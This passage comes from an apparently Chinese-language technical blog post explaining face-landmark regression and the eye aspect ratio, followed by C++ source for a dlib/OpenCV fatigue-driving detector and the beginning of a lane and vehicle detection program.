当获得一张图片后,算法会生成一个initial shape就是首先估计一个大致的特征点位置,然后采用
gradient boosting算法减小initial shape 和 ground truth 的平方误差总和。用最小二乘法来最小化误
差,得到每一级的级联回归因子。核心公式如下:
&lt;script type=&quot;math/tex&quot;&gt;\hat{S}^{t+1} = \hat{S}+r_{t}(I,\hat{t}^{t})&lt;/script&gt;
示当前级的回归器regressor。回归器的输入参数为图像I和上一级回归器更新后的shape,采用的特征可
以是灰度值或者其它。每个回归器由很多棵树(tree)组成,每棵树参数是根据current shape和ground
truth的坐标差和随机挑选的像素对训练得到的。&lt;/p&gt;

&lt;p&gt;与LBF不同,ERT是在学习Tree的过程中,直接将shape的更新值ΔS存入叶子结点leaf node.初始位
置S在通过所有学习到的Tree后,meanshape加上所有经过的叶子结点的ΔS,即可得到最终的人脸关
键点位置。&lt;/p&gt;

&lt;h1 id=&quot;ear参考意义&quot;&gt;EAR参考意义&lt;/h1&gt;

&lt;p&gt;“眼睛纵横比”(EAR):我们可以应用面部标志检测来定位脸部的重要区域,包括眼睛,眉毛,鼻子,
耳朵和嘴巴.&lt;/p&gt;

&lt;p&gt;1.其中p1…p6是2D面部地标位置;
2.方程的分子是计算垂直眼睛标志之间的距离，而分母是计算水平眼睛标志之间的距离，因为只有一组水平点，但是有两组垂直点，所以进行加权分母&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/EAR.png&quot; alt=&quot;EAR&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;当人眼闭眼时，EAR急剧减小，我们利用这一点去检测人眼闭眼状态&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/img/EARTEST.png&quot; alt=&quot;EARTEST&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;源码&quot;&gt;源码&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;FatigueDrivingDetection&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;main&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-02-05 14:56:20 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-02-09 13:39:19
 */
#include &amp;lt;main.h&amp;gt;
#include &amp;lt;render_face.h&amp;gt;
#include &amp;lt;Compute.h&amp;gt;
#include &amp;lt;BuzzerControl.h&amp;gt;
#include &amp;lt;fatigueDetection.h&amp;gt;
#include &amp;lt;getTime.h&amp;gt;
int main()
{
	//判断的基础信息
	double LeftEyeBase,RightEyeBase,InnerLipBase;
	//标志位,用于第一次录入基础信息
	int Base = 1;
	//记录哈欠次数
	int innerLipCounts = 0;
	//记录眯眼次数
	int squintingCounts = 0;
	try
	{
		//读取摄像头
		cv::VideoCapture cap(0);
		// 窗体大小设置,看需求
		//cap.set(CV_CAP_PROP_FRAME_WIDTH, 640);  
		//cap.set(CV_CAP_PROP_FRAME_HEIGHT, 480);  
		//模型加载 
		frontal_face_detector detector = get_frontal_face_detector();
		shape_predictor pose_model;
		deserialize(datPath) &amp;gt;&amp;gt; pose_model;
 
		int count = 0;
		std::vector&amp;lt;dlib::rectangle&amp;gt; faces;

		while (1)
		{
			cv::Mat img, img_small;
			cap &amp;gt;&amp;gt; img;
			//文字
			cv::putText(img,&quot;s:save,q:quit&quot;,cv::Point(img.rows/2,img.cols/2),FONT_HERSHEY_SIMPLEX,2,Scalar(0,0,255),1,8,false);
			cv::resize(img, img_small, cv::Size(), 1.0 / RATIO, 1.0 / RATIO);
 
			cv_image&amp;lt;bgr_pixel&amp;gt; cimg(img);
			cv_image&amp;lt;bgr_pixel&amp;gt; cimg_small(img_small);
 
			//人脸检测   
			if (count++ % SKIP_FRAMES == 0) {
				faces = detector(cimg_small);
			}
			cout &amp;lt;&amp;lt; &quot;检测人数:&quot; &amp;lt;&amp;lt; faces.size() &amp;lt;&amp;lt; endl;
			//无人状态
			if(faces.empty())
			{
				cout  &amp;lt;&amp;lt; &quot;\033[31m警告:无人状态\033[0m&quot;&amp;lt;&amp;lt; endl;
				//蜂鸣器功能,后续添加
				// BuzzerControl();
				getCurrentTime();
			}

			// 关键点检测  
			std::vector&amp;lt;full_object_detection&amp;gt; shapes;
			for (unsigned long i = 0; i &amp;lt; faces.size(); ++i) 
			{
				dlib::rectangle r(
					(long)(faces[i].left() * RATIO),
					(long)(faces[i].top() * RATIO),
					(long)(faces[i].right() * RATIO),
					(long)(faces[i].bottom() * RATIO)
				);
				// 关键点保存
				full_object_detection shape = pose_model(cimg, r);
				shapes.push_back(shape);
 
				//渲染画线
				render_face(img, shape);
				double rightEye = RightEyeCompute(img,shape);
				double leftEye = LeftEyeCompute(img,shape);
				double innerLip = InnerLipCompute(img,shape);
				cout&amp;lt;&amp;lt;&quot;-------------&quot;&amp;lt;&amp;lt;endl;

				//第一次识别信息导入,以此为后续判断的标注
				//RightEyeBase,LeftEyeBase,innerLipBase
				if(Base)
				{
					RightEyeBase = rightEye;
					LeftEyeBase = leftEye;
					InnerLipBase = innerLip;
					//退出信息录入,避免后续覆盖
					Base--;
					cout&amp;lt;&amp;lt;&quot;用户数据录入成功&amp;gt;&amp;gt;&amp;gt;初始化成功!&quot;&amp;lt;&amp;lt;endl;
				}
				int temp = fatigueDetection(LeftEyeBase,leftEye,RightEyeBase,rightEye,InnerLipBase,innerLip,innerLipCounts,squintingCounts);
				innerLipCounts += temp;
				squintingCounts += temp;
				//疲劳驾驶
				// innerLipCounts 哈欠次数 需要实际调试确定临界点
				if(innerLipCounts &amp;gt;= 50)
				{
					//红色打印
					cout  &amp;lt;&amp;lt; &quot;\033[31m警告:疲劳驾驶\033[0m&quot;&amp;lt;&amp;lt; endl;	
					getCurrentTime();	
				}
				// squintingCounts 眯眼次数
				if(squintingCounts &amp;gt;= 50)
				{
					//红色打印
					cout  &amp;lt;&amp;lt; &quot;\033[31m警告:疲劳驾驶\033[0m&quot;&amp;lt;&amp;lt; endl;	
					getCurrentTime();
				}
				//----------------------------------------------------
			}
			// std::cout &amp;lt;&amp;lt; &quot;count:&quot; &amp;lt;&amp;lt; count &amp;lt;&amp;lt; std::endl;
			if (img.empty())
			{
				cerr&amp;lt;&amp;lt;&quot;img is mepty!&quot;&amp;lt;&amp;lt;endl;
				getCurrentTime();
				break;
			}
			imshow(&quot;Frame&quot;, img);
			// Q q退出
			char c = (char)waitKey(25);
			if (c == 'Q' || c == 'q')
			{
				cout&amp;lt;&amp;lt;&quot;退出成功&quot;&amp;lt;&amp;lt;endl;
				getCurrentTime();
				break;
			}
			if(c == 's'||c == 'S')
			{
				cv::imwrite(&quot;../img/img.png&quot;,img);
				cout&amp;lt;&amp;lt;&quot;保存成功&quot;&amp;lt;&amp;lt;endl;
				getCurrentTime();
			}
		}
	}
	catch (serialization_error&amp;amp; e)
	{
		cout &amp;lt;&amp;lt; &quot;模型下载链接 &quot; &amp;lt;&amp;lt; endl;
		cout &amp;lt;&amp;lt; &quot;http://dlib.net/files/shape_predictor_68_face_landmarks.dat.bz2&quot; &amp;lt;&amp;lt; endl;
		cout &amp;lt;&amp;lt; endl &amp;lt;&amp;lt; e.what() &amp;lt;&amp;lt; endl;
		getCurrentTime();
	}
	catch (exception&amp;amp; e)
	{
		cout &amp;lt;&amp;lt; e.what() &amp;lt;&amp;lt; endl;
		getCurrentTime();
	}
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;BuzzerControl.h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-02-07 12:15:16 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-02-08 13:18:52
 */
// 蜂鸣器控制
#include &amp;lt;main.h&amp;gt;
int BuzzerControl()
{
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Compute.h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-02-06 12:29:42 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-02-08 13:19:28
 */
#include &amp;lt;main.h&amp;gt;
#include &amp;lt;cmath&amp;gt;
// 欧式距离计算
double PointsCompute(int x1,int y1,int x2,int y2)
{
    double results = 0;
    results = sqrt(pow(x1-x2,2) + pow(y1 - y2,2));
    return results;
}
// Right Eye:42~47
double RightEyeCompute(cv::Mat &amp;amp;img,const dlib::full_object_detection&amp;amp; d)
{
    double result = 0;
    std::vector&amp;lt;cv::Point&amp;gt; points;
    for(int i = 42;i &amp;lt;=47;++i)
    {
        points.push_back(cv::Point(d.part(i).x(), d.part(i).y()));
    }
    result = (PointsCompute(points[1].x,points[1].y,points[5].x,points[5].y) + PointsCompute(points[2].x,points[2].y,points[4].x,points[4].y))/(2*PointsCompute(points[0].x,points[0].y,points[3].x,points[3].y)); 
    cout&amp;lt;&amp;lt;&quot;右眼高宽比例:&quot;;
    cout&amp;lt;&amp;lt;result&amp;lt;&amp;lt;endl;
    return result;
}
//Left Eye:36 ~ 41
double LeftEyeCompute(cv::Mat &amp;amp;img,const dlib::full_object_detection&amp;amp; d)
{
    double result = 0;
    std::vector&amp;lt;cv::Point&amp;gt; points;
    for(int i = 36;i &amp;lt;=41;++i)
    {
        points.push_back(cv::Point(d.part(i).x(), d.part(i).y()));
    }
    result = (PointsCompute(points[1].x,points[1].y,points[5].x,points[5].y) + PointsCompute(points[2].x,points[2].y,points[4].x,points[4].y))/(2*PointsCompute(points[0].x,points[0].y,points[3].x,points[3].y)); 
    cout&amp;lt;&amp;lt;&quot;左眼高宽比例:&quot;;
    cout&amp;lt;&amp;lt;result&amp;lt;&amp;lt;endl;
    return result;
}
//inner lip :60 ~ 67
double InnerLipCompute(cv::Mat &amp;amp;img,const dlib::full_object_detection&amp;amp; d)
{
    double result = 0;
    std::vector&amp;lt;cv::Point&amp;gt; points;
    for(int i = 60;i &amp;lt;=67;++i)
    {
        points.push_back(cv::Point(d.part(i).x(), d.part(i).y()));
    }
    result = (PointsCompute(points[1].x,points[1].y,points[7].x,points[7].y) + PointsCompute(points[3].x,points[3].y,points[5].x,points[5].y))/(2*PointsCompute(points[0].x,points[0].y,points[4].x,points[4].y)); 
    cout&amp;lt;&amp;lt;&quot;内嘴唇高宽比例:&quot;;
    cout&amp;lt;&amp;lt;result&amp;lt;&amp;lt;endl;
    return result;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;fatigueDetection.h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-02-09 12:41:21 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-02-09 13:41:51
 */
//警告状态
#include &amp;lt;main.h&amp;gt;
int fatigueDetection(double leftEyeBase,double leftEye,double rightEyeBase,double rightEye,double innerLipBase,double innerLip,int innerLipCounts,int squintingCounts)
{
    //当内嘴唇高宽比例大于基础高宽比0.,定义位打哈欠
    if(innerLip - innerLipBase &amp;gt;= 0.3)
    {
        //绿色打印
        cout  &amp;lt;&amp;lt; &quot;\033[32m警告:哈欠:\033[0m&quot;&amp;lt;&amp;lt;innerLipCounts&amp;lt;&amp;lt; endl;
        //计数
        return 1;
    }
    if(leftEyeBase - leftEye &amp;gt;=0.1 || rightEyeBase - rightEye &amp;gt;= 0.1)
    {
        //绿色打印
        cout  &amp;lt;&amp;lt; &quot;\033[32m警告:眯眼:\033[0m&quot;&amp;lt;&amp;lt;squintingCounts&amp;lt;&amp;lt; endl;
        //计数
        return 1;
    }
    if((leftEye + rightEye)/2 &amp;lt; 0.2)
    {
        // 绿色打印
        cout  &amp;lt;&amp;lt; &quot;\033[32m警告:闭眼\033[0m&quot;&amp;lt;&amp;lt; endl;	
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;getTime.h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-02-09 13:27:35 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-02-09 13:37:06
 */
#include &amp;lt;main.h&amp;gt;
void getCurrentTime()
{
    time_t rawtime;
    struct tm *ptminfo;
 
    time(&amp;amp;rawtime);
    ptminfo = localtime(&amp;amp;rawtime);
    printf(&quot;current: %02d-%02d-%02d %02d:%02d:%02d\n&quot;,
            ptminfo-&amp;gt;tm_year + 1900, ptminfo-&amp;gt;tm_mon + 1, ptminfo-&amp;gt;tm_mday,
            ptminfo-&amp;gt;tm_hour, ptminfo-&amp;gt;tm_min, ptminfo-&amp;gt;tm_sec);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;main.h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-02-06 11:26:56 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-02-09 13:36:59
 */
#ifndef __BUILD__
#define __BUILD__
#include &amp;lt;dlib/opencv.h&amp;gt;  
#include &amp;lt;opencv2/opencv.hpp&amp;gt;  
#include &amp;lt;dlib/image_processing/frontal_face_detector.h&amp;gt;  
#include &amp;lt;dlib/image_processing/render_face_detections.h&amp;gt;  
#include &amp;lt;dlib/image_processing.h&amp;gt;  
#include &amp;lt;dlib/gui_widgets.h&amp;gt;  
#include &quot;opencv2/opencv.hpp&quot;
#include &amp;lt;iostream&amp;gt;
#include &amp;lt;ctime&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;sys/ioctl.h&amp;gt;

using namespace dlib;
using namespace std;
using namespace cv;

#define RATIO 4  
#define SKIP_FRAMES 2 

cv::String datPath = &quot;../config/shape_predictor_68_face_landmarks.dat&quot;;

#endif
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;render_face.h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-02-06 11:57:30 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-02-08 13:19:01
 */
#include &amp;lt;main.h&amp;gt;
// 画线 
void draw_polyline(cv::Mat &amp;amp;img, const dlib::full_object_detection&amp;amp; d, const int start, const int end, bool isClosed = false)
{
	std::vector &amp;lt;cv::Point&amp;gt; points;
	for (int i = start; i &amp;lt;= end; ++i)
	{
		points.push_back(cv::Point(d.part(i).x(), d.part(i).y()));
	}
	cv::polylines(img, points, isClosed, cv::Scalar(255, 0, 0), 2, 16);
}
// 渲染 
void render_face(cv::Mat &amp;amp;img, const dlib::full_object_detection&amp;amp; d)
{
	DLIB_CASSERT
	(
		d.num_parts() == 68,
		&quot;\n\t Invalid inputs were given to this function. &quot;
		&amp;lt;&amp;lt; &quot;\n\t d.num_parts():  &quot; &amp;lt;&amp;lt; d.num_parts()
	);
 
	draw_polyline(img, d, 0, 16);           // Jaw line
	draw_polyline(img, d, 17, 21);          // Left eyebrow
	draw_polyline(img, d, 22, 26);          // Right eyebrow
	draw_polyline(img, d, 27, 30);          // Nose bridge
	draw_polyline(img, d, 30, 35, true);    // Lower nose
	draw_polyline(img, d, 36, 41, true);    // Left eye
	draw_polyline(img, d, 42, 47, true);    // Right Eye
	draw_polyline(img, d, 48, 59, true);    // Outer lip
	draw_polyline(img, d, 60, 67, true);    // Inner lip
 
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;CMakeLists.txt&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-makefile&quot;&gt;#SET CMAKE VERSION
CMAKE_MINIMUM_REQUIRED(VERSION 2.8)
# 优化
# SET(CMAKE_C_FLAGS &quot;${CMAKE_C_FLAGS} -O2&quot;)
SET(CMAKE_CXX_FLAGS &quot;${CMAKE_CXX_FLAGS} -Ofast&quot;)
#SET PROJECT NAME
SET(PROJECT_NAME FatigueDrivingDetection)
#BUILD PROJECT NAME
PROJECT(${PROJECT_NAME})
#FIND OPENCV 
FIND_PACKAGE(OpenCV REQUIRED)
INCLUDE_DIRECTORIES(${OpenCV_INCLUDE_DIRS})
#FIND DLIB
FIND_PACKAGE(dlib REQUIRED)
INCLUDE_DIRECTORIES(${dlib_INCLUDE_DIRS})
#PRINT STATUS
MESSAGE(STATUS &quot;Project: ${PROJECT_NAME}&quot;)
MESSAGE(STATUS &quot;------------------------------------------------------&quot;)
MESSAGE(STATUS &quot;OpenCV library status:&quot;)
MESSAGE(STATUS &quot;version: ${OpenCV_VERSION}&quot;)
MESSAGE(STATUS &quot;libraries: ${OpenCV_LIBS}&quot;)
MESSAGE(STATUS &quot;include path: ${OpenCV_INCLUDE_DIRS}&quot;)
MESSAGE(STATUS &quot;------------------------------------------------------&quot;)
MESSAGE(STATUS &quot;DLIB library status:&quot;)
MESSAGE(STATUS &quot;version: ${dlib_VERSION}&quot;)
MESSAGE(STATUS &quot;libraries: ${dlib_LIBS}&quot;)
MESSAGE(STATUS &quot;include path: ${dlib_INCLUDE_DIRS}&quot;)
MESSAGE(STATUS &quot;------------------------------------------------------&quot;)
#GET CODE FROM SRC FOLDER
AUX_SOURCE_DIRECTORY(src DIR_SRCS)
include_directories(include)
MESSAGE(STATUS &quot;Src file: ${DIR_SRCS}&quot;)
#编译可执行程序
ADD_EXECUTABLE(${PROJECT_NAME} ${DIR_SRCS})
#添加链接库
TARGET_LINK_LIBRARIES(${PROJECT_NAME} ${OpenCV_LIBS} ${dlib_LIBRARIES})
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;lane_car_detect&quot;&gt;lane_car_detect&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;main.cpp&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-04-17 12:39:24 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-04-18 13:12:06
 */
#include &quot;yolo_car_detect.h&quot;
#include &quot;lane_detect.h&quot;
#include &amp;lt;iostream&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;error.h&amp;gt;

// 摄像头调用
// #define __USE__CAP_0__

//视频测试
#define __USE__VIDEO__

int main(int argc ,char *argv[]) 
{
	
	#ifdef  __USE__CAP_0__
	//摄像头测试
	cv::VideoCapture cap(0);
	#endif

	#ifdef  __USE__VIDEO__
	cv::VideoCapture cap(&quot;../video/test.mp4&quot;);
	#endif
	
	if (!cap.isOpened())
		return -1;
	//config检测
	configFileDect;
	//导入网络
    Net net = readNetFromDarknet(modelConfiguration, modelWeights);
    net.setPreferableBackend(DNN_BACKEND_OPENCV);
    net.setPreferableTarget(DNN_TARGET_CPU);
    Mat frame, blob;
	//lane检测
	LaneDetector lanedetector; 
	// frame处理
	while (i &amp;lt; 540) {
		//frame为空
		if (!cap.read(frame))
			break;
		//按照预先设定的参数初始化frame
        blobFromImage(frame, blob, 1/255.0, cvSize(inpWidth, inpHeight), Scalar(0,0,0), true, false);
        //将预处理后的frame输入网络
        net.setInput(blob);
        // 前向传播获取outs
        vector&amp;lt;Mat&amp;gt; outs;
        net.forward(outs, getOutputsNames(net));
        // 值信度抑制
		postprocess(frame, outs);
		//time
        vector&amp;lt;double&amp;gt; layersTimes;
        double f = getTickFrequency() / 1000;
        double t = net.getPerfProfile(layersTimes) / f;
        string label = format(&quot;Inference time for a frame : %.2f ms&quot;, t);
        putText(frame, label, Point(0, 15), FONT_HERSHEY_SIMPLEX, 0.5, Scalar(0, 0, 255));
		// 降噪
		img_denoise = lanedetector.deNoise(frame);
		//边缘检测
		img_edges = lanedetector.edgeDetector(img_denoise);
		// ROI
		img_mask = lanedetector.mask(img_edges);
		//霍夫线获取
		lines = lanedetector.houghLines(img_mask);
		if (!lines.empty())
		{
			//区分左右
			left_right_lines = lanedetector.lineSeparation(lines, img_edges);
			//过滤
			lane = lanedetector.regression(left_right_lines, frame);
			//消失点预测方向
			turn = lanedetector.predictTurn();
			//航向输出
			cout&amp;lt;&amp;lt;turn&amp;lt;&amp;lt;endl;
			//渲染
			flag_plot = lanedetector.plotLane(frame, lane, turn);
			cv::waitKey(25);
		}
		else {
			flag_plot = -1;
		}
	}
	return flag_plot;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;lane_detect.h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-04-17 18:45:15 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-04-17 18:46:14
 */
#include &amp;lt;string&amp;gt;
#include &amp;lt;opencv2/opencv.hpp&amp;gt;
class LaneDetector 
{
private:
	double img_size;
	double img_center;
    // 左边界
	bool left_flag = false;  
    // 右边界
	bool right_flag = false;
    // 车道线方程  
    // y = m*x + b
	cv::Point right_b;  
	double right_m;  
	cv::Point left_b; 
	double left_m;  

public:
    //高斯模糊
	cv::Mat deNoise(cv::Mat inputImage);  
    // 边缘提取
	cv::Mat edgeDetector(cv::Mat img_noise);
    // ROI  
	cv::Mat mask(cv::Mat img_edges);  
    // 霍夫线检测
	std::vector&amp;lt;cv::Vec4i&amp;gt; houghLines(cv::Mat img_mask);  
    //路线提取
	std::vector&amp;lt;std::vector&amp;lt;cv::Vec4i&amp;gt; &amp;gt; lineSeparation(std::vector&amp;lt;cv::Vec4i&amp;gt; lines, cv::Mat img_edges);  
    //车道线获取,一条
	std::vector&amp;lt;cv::Point&amp;gt; regression(std::vector&amp;lt;std::vector&amp;lt;cv::Vec4i&amp;gt; &amp;gt; left_right_lines, cv::Mat inputImage);  
    // 转向决策，消失点决策
	std::string predictTurn();  
    // 渲染绘画
	int plotLane(cv::Mat inputImage, std::vector&amp;lt;cv::Point&amp;gt; lane, std::string turn);  
};

cv::Mat LaneDetector::deNoise(cv::Mat inputImage) {
	cv::Mat output;
	cv::GaussianBlur(inputImage, output, cv::Size(3, 3), 0, 0);
	return output;
}

cv::Mat LaneDetector::edgeDetector(cv::Mat img_noise) {
	cv::Mat output;
	cv::Mat kernel;
	cv::Point anchor;

	//灰度化
	cv::cvtColor(img_noise, output, cv::COLOR_RGB2GRAY);
	// 二值化
	cv::threshold(output, output, 140, 255, cv::THRESH_BINARY);

    // 偏离警告
	anchor = cv::Point(-1, -1);
	kernel = cv::Mat(1, 3, CV_32F);
	kernel.at&amp;lt;float&amp;gt;(0, 0) = -1;
	kernel.at&amp;lt;float&amp;gt;(0, 1) = 0;
	kernel.at&amp;lt;float&amp;gt;(0, 2) = 1;

	//边缘提取
	cv::filter2D(output, output, -1, kernel, anchor, 0, cv::BORDER_DEFAULT);
	// cv::imshow(&quot;output&quot;, output);
	return output;
}

cv::Mat LaneDetector::mask(cv::Mat img_edges) {
	cv::Mat output;
    // 创建mask
	cv::Mat mask = cv::Mat::zeros(img_edges.size(), img_edges.type());
	// 定位点
    cv::Point pts[4] = {
		cv::Point(210, 720),
		cv::Point(550, 450),
		cv::Point(717, 450),
		cv::Point(1280, 720)
	};
    // 区域填充
	cv::fillConvexPoly(mask, pts, 4, cv::Scalar(255, 0, 0));
	//图像和mask相乘输出
	cv::bitwise_and(img_edges, mask, output);
	return output;
}

//霍夫直线检测
std::vector&amp;lt;cv::Vec4i&amp;gt; LaneDetector::houghLines(cv::Mat img_mask) {
	std::vector&amp;lt;cv::Vec4i&amp;gt; line;
	HoughLinesP(img_mask, line, 1, CV_PI / 180, 20, 20, 30);

	return line;
}
//路线提取
//过滤line
//左右两条line
std::vector&amp;lt;std::vector&amp;lt;cv::Vec4i&amp;gt; &amp;gt; LaneDetector::lineSeparation(std::vector&amp;lt;cv::Vec4i&amp;gt; lines, cv::Mat img_edges) {
	std::vector&amp;lt;std::vector&amp;lt;cv::Vec4i&amp;gt; &amp;gt; output(2);
	size_t j = 0;
	cv::Point ini;
	cv::Point fini;
    //斜率限制阈值
	double slope_thresh = 0.3;
	std::vector&amp;lt;double&amp;gt; slopes;
	std::vector&amp;lt;cv::Vec4i&amp;gt; selected_lines;
	std::vector&amp;lt;cv::Vec4i&amp;gt; right_lines, left_lines;

	// 斜率计算
	for (auto i : lines) {
		ini = cv::Point(i[0], i[1]);
		fini = cv::Point(i[2], i[3]);

		// m = (y1 - y0)/(x1 - x0)
		double slope = (static_cast&amp;lt;double&amp;gt;(fini.y) - static_cast&amp;lt;double&amp;gt;(ini.y)) / (static_cast&amp;lt;double&amp;gt;(fini.x) - static_cast&amp;lt;double&amp;gt;(ini.x) + 0.00001);

		//如果小于限制阈值，则去除
        //保存大于限制阈值的线
		if (std::abs(slope) &amp;gt; slope_thresh) {
			slopes.push_back(slope);
			selected_lines.push_back(i);
		}
	}

	// 区分左右线
	img_center = static_cast&amp;lt;double&amp;gt;((img_edges.cols / 2));
	while (j &amp;lt; selected_lines.size()) {
		ini = cv::Point(selected_lines[j][0], selected_lines[j][1]);
		fini = cv::Point(selected_lines[j][2], selected_lines[j][3]);

		// 如果斜率大于０且fini.x和fini大于图像中心点,则判断为左侧,反之右侧
		if (slopes[j] &amp;gt; 0 &amp;amp;&amp;amp; fini.x &amp;gt; img_center &amp;amp;&amp;amp; ini.x &amp;gt; img_center) {
			right_lines.push_back(selected_lines[j]);
			right_flag = true;
		}
		else if (slopes[j] &amp;lt; 0 &amp;amp;&amp;amp; fini.x &amp;lt; img_center &amp;amp;&amp;amp; ini.x &amp;lt; img_center) {
			left_lines.push_back(selected_lines[j]);
			left_flag = true;
		}
		j++;
	}

	output[0] = right_lines;
	output[1] = left_lines;

	return output;
}

//最终车道线选择
std::vector&amp;lt;cv::Point&amp;gt; LaneDetector::regression(std::vector&amp;lt;std::vector&amp;lt;cv::Vec4i&amp;gt; &amp;gt; left_right_lines, cv::Mat inputImage) {
	std::vector&amp;lt;cv::Point&amp;gt; output(4);
	cv::Point ini;
	cv::Point fini;
	cv::Point ini2;
	cv::Point fini2;
	cv::Vec4d right_line;
	cv::Vec4d left_line;
	std::vector&amp;lt;cv::Point&amp;gt; right_pts;
	std::vector&amp;lt;cv::Point&amp;gt; left_pts;

	// 检测到右侧线，则把点给连上
	if (right_flag == true) {
		for (auto i : left_right_lines[0]) {
			ini = cv::Point(i[0], i[1]);
			fini = cv::Point(i[2], i[3]);

			right_pts.push_back(ini);
			right_pts.push_back(fini);
		}

		if (right_pts.size() &amp;gt; 0) {
			//拟合
			cv::fitLine(right_pts, right_line, CV_DIST_L2, 0, 0.01, 0.01);
			right_m = right_line[1] / right_line[0];
			right_b = cv::Point(right_line[2], right_line[3]);
		}
	}

	// 检测到左侧线，则把点给连上
	if (left_flag == true) {
		for (auto j : left_right_lines[1]) {
			ini2 = cv::Point(j[0], j[1]);
			fini2 = cv::Point(j[2], j[3]);

			left_pts.push_back(ini2);
			left_pts.push_back(fini2);
		}

		if (left_pts.size() &amp;gt; 0) {
			//拟合
			cv::fitLine(left_pts, left_line, CV_DIST_L2, 0, 0.01, 0.01);
			left_m = left_line[1] / left_line[0];
			left_b = cv::Point(left_line[2], left_line[3]);
		}
	}

	// 通过直线方程获得点
	int ini_y = inputImage.rows;
	int fin_y = 470;

	double right_ini_x = ((ini_y - right_b.y) / right_m) + right_b.x;
	double right_fin_x = ((fin_y - right_b.y) / right_m) + right_b.x;

	double left_ini_x = ((ini_y - left_b.y) / left_m) + left_b.x;
	double left_fin_x = ((fin_y - left_b.y) / left_m) + left_b.x;

	output[0] = cv::Point(right_ini_x, ini_y);
	output[1] = cv::Point(right_fin_x, fin_y);
	output[2] = cv::Point(left_ini_x, ini_y);
	output[3] = cv::Point(left_fin_x, fin_y);

	return output;
}


std::string LaneDetector::predictTurn() {
	std::string output;
	double vanish_x;
	double thr_vp = 10;

	//消失点:两直线交点
	vanish_x = static_cast&amp;lt;double&amp;gt;(((right_m*right_b.x) - (left_m*left_b.x) - right_b.y + left_b.y) / (right_m - left_m));

	//决策
	if (vanish_x &amp;lt; (img_center - thr_vp))
		output = &quot;Left Turn&quot;;
	else if (vanish_x &amp;gt;(img_center + thr_vp))
		output = &quot;Right Turn&quot;;
	else if (vanish_x &amp;gt;= (img_center - thr_vp) &amp;amp;&amp;amp; vanish_x &amp;lt;= (img_center + thr_vp))
		output = &quot;Straight&quot;;

	return output;
}

int LaneDetector::plotLane(cv::Mat inputImage, std::vector&amp;lt;cv::Point&amp;gt; lane, std::string turn) 
{
	std::vector&amp;lt;cv::Point&amp;gt; poly_points;
	cv::Mat output;

	//渲染内部
	inputImage.copyTo(output);
	poly_points.push_back(lane[2]);
	poly_points.push_back(lane[0]);
	poly_points.push_back(lane[1]);
	poly_points.push_back(lane[3]);
	cv::fillConvexPoly(output, poly_points, cv::Scalar(0, 0, 255), CV_AA, 0);
	cv::addWeighted(output, 0.3, inputImage, 1.0 - 0.3, 0, inputImage);

	//划线
	cv::line(inputImage, lane[0], lane[1], cv::Scalar(0, 255, 255), 5, CV_AA);
	cv::line(inputImage, lane[2], lane[3], cv::Scalar(0, 255, 255), 5, CV_AA);

	// 决策信息
